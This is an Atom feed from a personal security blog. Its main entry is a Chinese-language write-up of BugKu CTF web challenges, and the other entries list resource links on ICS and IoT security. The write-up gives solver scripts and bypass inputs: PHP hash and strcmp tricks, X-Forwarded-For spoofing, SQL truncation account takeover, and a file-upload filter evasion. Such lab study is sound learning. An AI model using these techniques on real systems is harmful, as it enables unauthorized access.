<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Tsunamori&#39;s blog</title>
  
  
  <link href="https://tsunamori.github.io/atom.xml" rel="self"/>
  
  <link href="https://tsunamori.github.io/"/>
  <updated>2021-05-11T08:38:55.765Z</updated>
  <id>https://tsunamori.github.io/</id>
  
  <author>
    <name>Tsunamori</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>WP-BugKu-Web</title>
    <link href="https://tsunamori.github.io/wiki/WP-Bugku-Web/"/>
    <id>https://tsunamori.github.io/wiki/WP-Bugku-Web/</id>
    <published>2021-05-08T03:43:54.000Z</published>
    <updated>2021-05-11T08:38:55.765Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Web-18"><a href="#Web-18" class="headerlink" title="Web 18"></a>Web 18</h4><p>提示：题目刷新几次后有提示，需要计算数值并post value。</p><ul><li>考点：爬虫复习、利用eval()直接计算string内的数字公式、利用同一个Session进行get和post请求，防止网页动态刷新计算值失效、post请求中data注意格式为{‘somevtext’：’somevalue’}、python和PHP的计算方式不太一样，可能存在计算偏差导致得不到flag，需要重复发送几次。  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;114.67.246.176:14925&#x2F;&#39;</span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line">r &#x3D; s.get(url)</span><br><span class="line">r.encoding &#x3D; &#39;utf-8&#39;</span><br><span class="line">soup&#x3D;BeautifulSoup(r.text,&#39;lxml&#39;)</span><br><span class="line">data&#x3D;soup.select(&#39;div&#39;)</span><br><span class="line">for item in data:</span><br><span class="line">    #获取原文为804134448*284526014-53361872*1933492032+466213037-393751154*4253881+1224286171-1203351395*1548147628+1689398514&#x3D;?;</span><br><span class="line">    result&#x3D;item.get_text()</span><br><span class="line"></span><br><span class="line">result1&#x3D;result[0:len(result)-3] #去掉后三位‘&#x3D;?;’</span><br><span class="line">result2 &#x3D; eval(result1) #计算数值</span><br><span class="line">result3&#x3D;&#123;&#39;value&#39;:result2&#125; #添加post请求数据格式</span><br><span class="line"></span><br><span class="line">mssg&#x3D;s.post(url, data&#x3D;result3) #利用同一个session，防止网页刷新。</span><br><span class="line"></span><br><span class="line">print(mssg.text)</span><br></pre></td></tr></table></figure></li></ul><h4 id="Web-19"><a href="#Web-19" class="headerlink" title="Web 19"></a>Web 19</h4><p>提示： OK ,now you have to post the margin what you find</p><ul><li>解题思路：刷新几次之后没有发现变化，f12看network请求，在response包header内看到base64加密的flag，解码后为‘跑的还不错，给你flag吧: MjE0Nzg1’，一开始并没有意识到后面是base64的密文，直到一次运行爬虫发现密文有=号结尾。根据其他人的解读，说margin是数字所以提示了有两次base64解密，完全没有意识到这一层，我只猜到了post数据时数据格式为{‘margin’:xxx}，不得不说这提示的语法不太行，应该删掉what，这个着实困扰了。<br>  这个解开之后就简单很多了，另一个难点是在py3里string无法直接用base64解密，需要先转换成ascii。以及解密之后的返回值为bytes，需要转换成utf-8格式再进行后续删减处理，不然有<code>b’‘</code>等噪音。  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;114.67.246.176:19877&#x2F;&#39;</span><br><span class="line">s&#x3D;requests.session()</span><br><span class="line"></span><br><span class="line">r&#x3D;s.get(url).headers.get(&#39;flag&#39;)</span><br><span class="line">r1&#x3D;base64.b64decode(r.encode(&#39;ascii&#39;))</span><br><span class="line">r2&#x3D;r1.decode(&quot;utf-8&quot;)</span><br><span class="line">r3&#x3D;r2[len(r2)-8:len(r2)]</span><br><span class="line">r4&#x3D;base64.b64decode(r3.encode(&#39;ascii&#39;)).decode(&quot;utf-8&quot;)</span><br><span class="line"></span><br><span class="line">print(s.post(url, data&#x3D;&#123;&#39;margin&#39;:r4&#125;).text)</span><br></pre></td></tr></table></figure></li></ul><h4 id="Web-23"><a href="#Web-23" class="headerlink" title="Web 23"></a>Web 23</h4><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#39;2.php&#39;);</span><br><span class="line">$key&#x3D;&#39;flag&#123;********************************&#125;&#39;;</span><br><span class="line">$IM&#x3D; preg_match(&quot;&#x2F;key.*key.&#123;4,7&#125;key:\&#x2F;.\&#x2F;(.*key)[a-z][[:punct:]]&#x2F;i&quot;, trim($_GET[&quot;id&quot;]), $match);</span><br><span class="line">if( $IM )&#123;</span><br><span class="line"> die(&#39;key is: &#39;.$key);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>解题思路：基本上难点都在这句正则上了，外加一个trim()去掉输入值前后的空白字符。解读一下php语句，就是当id的输入值符合正则时，退出（die）并返回key。2.php在此处仅为含有该php语句的文件（highlight_file），与输入值无关。跟着这道题试验了好几个找到的在线正则工具，发现还是regex101好用。<br><code>/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i</code>，<code>&#123;4,7&#125;</code>表示重复前面部分4～7次，<code>[:punct:]</code>为所有的特殊字符。<br>payload：<code>keykeykkeykey:/k/keya[:punct:]</code></li></ul><h4 id="Web-24"><a href="#Web-24" class="headerlink" title="Web 24"></a>Web 24</h4><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;</span><br><span class="line">    $v1 &#x3D; $_GET[&#39;v1&#39;];</span><br><span class="line">    $v2 &#x3D; $_GET[&#39;v2&#39;];</span><br><span class="line">    $v3 &#x3D; $_GET[&#39;v3&#39;];</span><br><span class="line">    if($v1 !&#x3D; $v2 &amp;&amp; md5($v1) &#x3D;&#x3D; md5($v2))&#123;</span><br><span class="line">        if(!strcmp($v3, $flag))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>解题思路：似曾相识的MD5相等题，此次应掏出MD5绕过笔记。strcmp(str1,str2),如果str1小于str2返回&lt;0；如果str1大于str2返回&gt;0；如果两者相等，返回0。因为是if(!xxx)返回flag，所以v3和flag相等。搜索strcmp绕过，可知当传入的类型非期望类型时，即传入值非string时，发生错误，返回0。如：数组,<code>?a[]=2</code></li></ul><h4 id="Web-25"><a href="#Web-25" class="headerlink" title="Web 25"></a>Web 25</h4><p>提示：SQL约束攻击</p><ul><li>解题思路：点开链接，发现是一个后台登录站点，先放着不管，查一下提示给的SQL约束攻击。内容也算似曾相识，之前在bug bounty的hint里面见过，也就是利用用户名长度限制，在用户名最后加上多个空白字符以及末尾一个用于绕过用户名是否已注册的对比的任意字符，那么在存储时，数据库仅存储前X位字符，导致攻击者可以取代登录目标用户。ref：<a href="https://www.freebuf.com/articles/web/124537.html">https://www.freebuf.com/articles/web/124537.html</a><br>知道了就简单了，思路是先盲猜管理员用户名，然后通过SQL约束攻击注册新帐号，取代替换原管理员帐号的密码。</li></ul><h4 id="Web-26"><a href="#Web-26" class="headerlink" title="Web 26"></a>Web 26</h4><p>提示：are you from google?</p><ul><li>解题思路：这个提示已经很明显了，直接包头加转发（referer），表示自己是从google来的就行。突然在想x-forward-for为啥不行，查了一下XFF必须是IP地址。</li></ul><h4 id="Web-27"><a href="#Web-27" class="headerlink" title="Web 27"></a>Web 27</h4><p>提示：<br>    1. please input a<br>    2. md5 collision</p><ul><li>解题思路：MD5碰撞，题面只有一句please input a，盲猜是输入a和某个值碰撞，那么首先试试输入数组报错法，回显<code>false!!</code>，起码证明思路应该是对的，重新查了查MD5碰撞，猜测题目是强类型不能绕过。但不知道另一个对比值要怎么做真实碰撞呢？<br>好家伙，看了看提示，发现是没给对比值源码。。。行8</li></ul><h4 id="Web-28"><a href="#Web-28" class="headerlink" title="Web 28"></a>Web 28</h4><p>提示：请从本地访问。</p><ul><li>解题思路：好的看到本地访问又稳了，直接开链接搞XFF。题目不但似曾相识还莫名的变简单了。。。<br>我一般是上burp，不过在评论里看到一个<code>curl -H &quot;X-Forwarded-For: 127.0.0.1&quot; http://114.67.246.176:18832/</code>，码住。</li></ul><h4 id="Web-29"><a href="#Web-29" class="headerlink" title="Web 29"></a>Web 29</h4><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#39;flag.php&#39;);</span><br><span class="line">$_GET[&#39;id&#39;] &#x3D; urldecode($_GET[&#39;id&#39;]);</span><br><span class="line">$flag &#x3D; &#39;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#39;;</span><br><span class="line">if (isset($_GET[&#39;uname&#39;]) and isset($_POST[&#39;passwd&#39;])) &#123;</span><br><span class="line">   if ($_GET[&#39;uname&#39;] &#x3D;&#x3D; $_POST[&#39;passwd&#39;])</span><br><span class="line"></span><br><span class="line">       print &#39;passwd can not be uname.&#39;;</span><br><span class="line"></span><br><span class="line">   else if (sha1($_GET[&#39;uname&#39;]) &#x3D;&#x3D;&#x3D; sha1($_POST[&#39;passwd&#39;])&amp;($_GET[&#39;id&#39;]&#x3D;&#x3D;&#39;margin&#39;))</span><br><span class="line"></span><br><span class="line">       die(&#39;Flag: &#39;.$flag);</span><br><span class="line">   else</span><br><span class="line">       print &#39;sorry!&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>解题思路：urldecode,解码给出的已编码字符串中的任何%##。加号（’+’）被解码成一个空格字符。看题目是个sha1绕过，查了一下和MD5绕过差不多，弱类型可以用数组，强类型可以用碰撞结果相同的值（<code>sha1(str)``sha1(&#39;aaroZmOk&#39;)</code>  <code>sha1(&#39;aaK1STfY&#39;)``sha1(&#39;aaO8zKZF&#39;)``sha1(&#39;aa3OFF9m&#39;)</code>）。</li></ul><h4 id="Web-30"><a href="#Web-30" class="headerlink" title="Web 30"></a>Web 30</h4><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">extract($_GET);</span><br><span class="line">if (!empty($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f &#x3D; trim(file_get_contents($fn));</span><br><span class="line">if ($ac &#x3D;&#x3D;&#x3D; $f)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;sorry!&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>解题思路：extract — 从数组中将变量导入到当前的符号表。不是很熟练，看了评论，是导入站点的文件并且和get输入变量对比。另一个思路file_get_contents绕过。所以有两种方式，一种是利用站点文件flag.txt，输入<code>?fn=flag.txt&amp;ac=bugku</code>，另一种是<code>?ac=bug&amp;fn=php://input</code>，post数据<code>bug</code>。</li></ul><h4 id="Web-31"><a href="#Web-31" class="headerlink" title="Web 31"></a>Web 31</h4><p>提示：好像需要管理员</p><ul><li>解题思路：一打开是个404,最下面是<code>Generated by kangle/3.5.5.</code> ，结合提示需要管理员，那就先从这个入手找找漏洞。搜了一下，控制面板管理员后台3312/admin，但是分发的虚拟机也不太能这么找后台。上sourceleakhacker扫一下，robots.txt爆出一个路径<code>Disallow: /resusl.php</code>，访问，提示<code>Warning:你不是管理员你的IP已经被记录到日志了</code>以及<code>if ($_GET[x]==$password) 此处省略1w字</code>，也就是XFF127.0.0.1并发送password，结合kangle的弱口令admin/admin，得到flag。这里XFF但password不对时显示的IP地址还是我本地址而不是127.0.0.1,差点又以为思路错了。</li></ul><h4 id="Web-32"><a href="#Web-32" class="headerlink" title="Web 32"></a>Web 32</h4><p>题目：文件上传;My name is margin,give me a image file not a php</p><ul><li>解题思路：文件上传漏洞，掏出上传fuzz试试看。<br>fuzz没过，看评论说是把multipart/form-data;修改成Content-Type: mulTipart/form-data; ，然后修改php文件为php4，竟然还有这种操作，学到了。</li></ul><h4 id="Web-33"><a href="#Web-33" class="headerlink" title="Web 33"></a>Web 33</h4><p>提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Flag:&#123;xxx&#125;</span><br><span class="line">fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA&#x3D;</span><br><span class="line"> &#x2F;&#x2F; &#125;l.&amp;W&#39;EG*B(W[(+G&#39;U-0</span><br></pre></td></tr></table></figure><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function encrypt($data,$key)</span><br><span class="line">&#123;</span><br><span class="line">    $key &#x3D; md5(&#39;ISCC&#39;);</span><br><span class="line">    $x &#x3D; 0;</span><br><span class="line">    $len &#x3D; strlen($data);</span><br><span class="line">    $klen &#x3D; strlen($key);</span><br><span class="line">    for ($i&#x3D;0; $i &lt; $len; $i++) &#123;</span><br><span class="line">        if ($x &#x3D;&#x3D; $klen)</span><br><span class="line">        &#123;</span><br><span class="line">            $x &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .&#x3D; $key[$x];</span><br><span class="line">        $x+&#x3D;1;</span><br><span class="line">    &#125;</span><br><span class="line">    for ($i&#x3D;0; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $str .&#x3D; chr((ord($data[$i]) + ord($char[$i])) % 128);</span><br><span class="line">    &#125;</span><br><span class="line">    return base64_encode($str);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>解题思路：在线解base64的时候还没注意到，复制下来才发现还有特殊字符。<code>.=</code>连接赋值运算符，将右边参数附加到左边的参数之后。完整的看了一遍代码，发现应该是如何计算出提示中base64字符串的算法。懒得配环境，对PHP一直是只会读代码不会写应用的状态，干脆在网上找了找PHP在线运行网站<code>www.anycodes.cn</code>。试着运行了一下原算法，用不同的数字和字母输入data内容，观察运行。<br>然后根据提示中的base64推断，data长度为20。<br>逆推写了一下获取data的源码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str&#x3D;&#39;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA&#x3D;&#39;;</span><br><span class="line">$str_decode &#x3D; base64_decode($str);</span><br><span class="line">$len1&#x3D;strlen($str_decode);</span><br><span class="line"></span><br><span class="line">$key &#x3D; md5(&#39;ISCC&#39;);  # 729623334f0aa2784a1599fd374c120d</span><br><span class="line">$klen &#x3D; strlen($key);</span><br><span class="line">$char &#x3D; &#39;&#39;;</span><br><span class="line">$data &#x3D; &#39;&#39;;</span><br><span class="line">for ($i&#x3D;0; $i &lt; $len1; $i++) &#123;</span><br><span class="line">        if ($x &#x3D;&#x3D; $klen)</span><br><span class="line">        &#123;</span><br><span class="line">            $x &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .&#x3D; $key[$x]; # 729623334f0aa2784a1599fd374c120d729623</span><br><span class="line">        $x+&#x3D;1;</span><br><span class="line">    &#125;</span><br><span class="line"># print($len1); -&gt; 38</span><br><span class="line"># print($char); -&gt; 729623334f0aa2784a1599fd374c120d729623</span><br><span class="line">for ($i&#x3D;0; $i &lt; $len1; $i++) &#123;</span><br><span class="line">        $data .&#x3D; chr((ord($str_decode[$i])+128)-ord($char[$i]));</span><br><span class="line">    &#125;</span><br><span class="line">print($data);    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>得到结果：lag{asdqwdfasfdawfefqwdqwdadwqadawd}，提示里写了Flag:{xxx}，所以把结果改成Flag:{asdqwdfasfdawfefqwdqwdadwqadawd}，结果正确。</li><li>总结： 难点主要在一开始完整的阅读代码理解意思，并且顺利的逆推<code>$str .= chr((ord($data[$i]) + ord($char[$i])) % 128);</code>这句代码。关于这句代码我自己写了写逆推笔记，记录如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ord($di)+ord($ci) &#x3D; A #简化原代码，$di&#x3D;$data[$i],$ci&#x3D;$char[$i],$str1&#x3D;$str[$i].</span><br><span class="line">$str1 &#x3D; chr((ord($di)+ord($ci)) % 128) #chr和ord为互补，所以从右边拿到左边就变成ord。</span><br><span class="line">ord($str1)&#x3D;(ord($di)+ord($ci)) % 128 #在这里简化一下得到下面。</span><br><span class="line">ord($str1)&#x3D;(A) % 128</span><br><span class="line">ord($str1)+128&#x3D;(A) #这里有一点盲猜的成分，因为ord得出的值范围在0～255之间，而A为两个ord相加，所以数值范围应该在0～510,也就是A mod 128的结果在0～127之间。无法确定到底A净除了几个128的情况下，我选择先加一个128,看一下到底能不能运行。</span><br><span class="line">ord($di) &#x3D; A-ord($ci) #从最后产出的base64密文解密可得data的长度，而char的内容只和md5(&#39;ISCC&#39;)和data长度有关，所以可以知道char的内容。</span><br><span class="line">$di &#x3D; chr(A-ord($ci)) #这里可以把原本简化的A用原内容代替回来了。</span><br><span class="line">$di &#x3D; chr((ord($str1)+128)-ord($ci)) #思路就是这样，然后根据这个写代码。</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Web-18&quot;&gt;&lt;a href=&quot;#Web-18&quot; class=&quot;headerlink&quot; title=&quot;Web 18&quot;&gt;&lt;/a&gt;Web 18&lt;/h4&gt;&lt;p&gt;提示：题目刷新几次后有提示，需要计算数值并post value。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;考点：爬虫复习、</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
    
    <category term="121 Web" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"/>
    
    
    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
    
    <category term="WriteUp" scheme="https://tsunamori.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>CTF_IoT</title>
    <link href="https://tsunamori.github.io/wiki/CTF_IoT/"/>
    <id>https://tsunamori.github.io/wiki/CTF_IoT/</id>
    <published>2021-04-29T09:34:18.000Z</published>
    <updated>2021-04-29T09:36:08.045Z</updated>
    
    <content type="html"><![CDATA[<h4 id="stm32"><a href="#stm32" class="headerlink" title="stm32"></a>stm32</h4><p><a href="https://www.anquanke.com/post/id/229321">https://www.anquanke.com/post/id/229321</a><br><a href="https://www.anquanke.com/post/id/231440">https://www.anquanke.com/post/id/231440</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;stm32&quot;&gt;&lt;a href=&quot;#stm32&quot; class=&quot;headerlink&quot; title=&quot;stm32&quot;&gt;&lt;/a&gt;stm32&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/229321&quot;&gt;https://</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
    
    <category term="128 IoT" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/128-IoT/"/>
    
    
    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ICS_CTF</title>
    <link href="https://tsunamori.github.io/wiki/CTF_ICS/"/>
    <id>https://tsunamori.github.io/wiki/CTF_ICS/</id>
    <published>2021-04-29T07:05:16.000Z</published>
    <updated>2021-04-29T08:04:36.057Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Modbus-赛题"><a href="#Modbus-赛题" class="headerlink" title="Modbus 赛题"></a>Modbus 赛题</h4><p><a href="https://www.anquanke.com/post/id/185513">https://www.anquanke.com/post/id/185513</a></p><h3 id="工控安全CTF-工具"><a href="#工控安全CTF-工具" class="headerlink" title="工控安全CTF 工具"></a>工控安全CTF 工具</h3><ol><li>网络数据包处理脚本 <a href="https://github.com/NewBee119/ctf_ics_traffic">https://github.com/NewBee119/ctf_ics_traffic</a></li><li>Modbus 脚本 <a href="https://github.com/arnaudsoullie/funwithmodbus0x5a">https://github.com/arnaudsoullie/funwithmodbus0x5a</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Modbus-赛题&quot;&gt;&lt;a href=&quot;#Modbus-赛题&quot; class=&quot;headerlink&quot; title=&quot;Modbus 赛题&quot;&gt;&lt;/a&gt;Modbus 赛题&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="120 CTF" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"/>
    
    <category term="128 ICS" scheme="https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/128-ICS/"/>
    
    
    <category term="CTF" scheme="https://tsunamori.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>车联网安全</title>
    <link href="https://tsunamori.github.io/wiki/%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    <id>https://tsunamori.github.io/wiki/%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/</id>
    <published>2021-04-28T08:50:20.000Z</published>
    <updated>2021-04-28T08:55:27.841Z</updated>
    
    <content type="html"><![CDATA[<ol><li>初识智能网联汽车安全 <a href="https://www.anquanke.com/post/id/230212">https://www.anquanke.com/post/id/230212</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;初识智能网联汽车安全 &lt;a href=&quot;https://www.anquanke.com/post/id/230212&quot;&gt;https://www.anquanke.com/post/id/230212&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
</summary>
      
    
    
    
    <category term="500 IoT security" scheme="https://tsunamori.github.io/categories/500-IoT-security/"/>
    
    <category term="510 Automotive security" scheme="https://tsunamori.github.io/categories/500-IoT-security/510-Automotive-security/"/>
    
    
    <category term="IoT" scheme="https://tsunamori.github.io/tags/IoT/"/>
    
  </entry>
  
  <entry>
    <title>工控安全</title>
    <link href="https://tsunamori.github.io/wiki/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/"/>
    <id>https://tsunamori.github.io/wiki/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/</id>
    <published>2021-04-28T07:50:51.000Z</published>
    <updated>2021-04-29T09:09:36.169Z</updated>
    
    <content type="html"><![CDATA[<h4 id="工控安全入门"><a href="#工控安全入门" class="headerlink" title="工控安全入门"></a>工控安全入门</h4><ol><li><p>工控安全从入门到实战<br> （一） <a href="https://www.anquanke.com/post/id/178265">https://www.anquanke.com/post/id/178265</a><br> （二） <a href="https://www.anquanke.com/post/id/178425">https://www.anquanke.com/post/id/178425</a></p></li><li><p>工控安全Wiki <a href="https://www.yuque.com/tidesec/ics">https://www.yuque.com/tidesec/ics</a></p></li><li><p>工控安全协议入门<br> Modbus 协议 <a href="https://www.anquanke.com/post/id/185513">https://www.anquanke.com/post/id/185513</a><br> S7comm 协议 <a href="https://www.anquanke.com/post/id/186099">https://www.anquanke.com/post/id/186099</a></p><pre><code>         https://www.anquanke.com/post/id/186587</code></pre><p> DNP3协议 <a href="https://www.anquanke.com/post/id/187221">https://www.anquanke.com/post/id/187221</a></p></li><li><p>工控安全相关资源（协议数据包等） <a href="https://github.com/w3h/icsmaster">https://github.com/w3h/icsmaster</a></p></li></ol><h4 id="工控安全工具"><a href="#工控安全工具" class="headerlink" title="工控安全工具"></a>工控安全工具</h4><ol><li>ICS windows v2.0 <a href="https://www.anquanke.com/post/id/227645">https://www.anquanke.com/post/id/227645</a> （含工具列表）</li></ol><h4 id="实验室"><a href="#实验室" class="headerlink" title="实验室"></a>实验室</h4><ol><li>工控安全-灯塔实验室 <a href="http://plcscan.org/blog/category/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/">http://plcscan.org/blog/category/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/</a></li><li>工控安全-Tide安全团队 <a href="http://www.tidesec.net/">http://www.tidesec.net/</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;工控安全入门&quot;&gt;&lt;a href=&quot;#工控安全入门&quot; class=&quot;headerlink&quot; title=&quot;工控安全入门&quot;&gt;&lt;/a&gt;工控安全入门&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;工控安全从入门到实战&lt;br&gt; （一） &lt;a href=&quot;https://www.anqua</summary>
      
    
    
    
    <category term="400 ICS security" scheme="https://tsunamori.github.io/categories/400-ICS-security/"/>
    
    
    <category term="ICS" scheme="https://tsunamori.github.io/tags/ICS/"/>
    
  </entry>
  
  <entry>
    <title>近源渗透</title>
    <link href="https://tsunamori.github.io/wiki/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F/"/>
    <id>https://tsunamori.github.io/wiki/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F/</id>
    <published>2021-04-28T07:05:26.000Z</published>
    <updated>2021-04-28T07:56:44.933Z</updated>
    
    <content type="html"><![CDATA[<ol><li>红蓝对抗中的近源渗透 <a href="https://security.tencent.com/index.php/blog/msg/167">https://security.tencent.com/index.php/blog/msg/167</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;红蓝对抗中的近源渗透 &lt;a href=&quot;https://security.tencent.com/index.php/blog/msg/167&quot;&gt;https://security.tencent.com/index.php/blog/msg/167&lt;/a&gt;&lt;/l</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
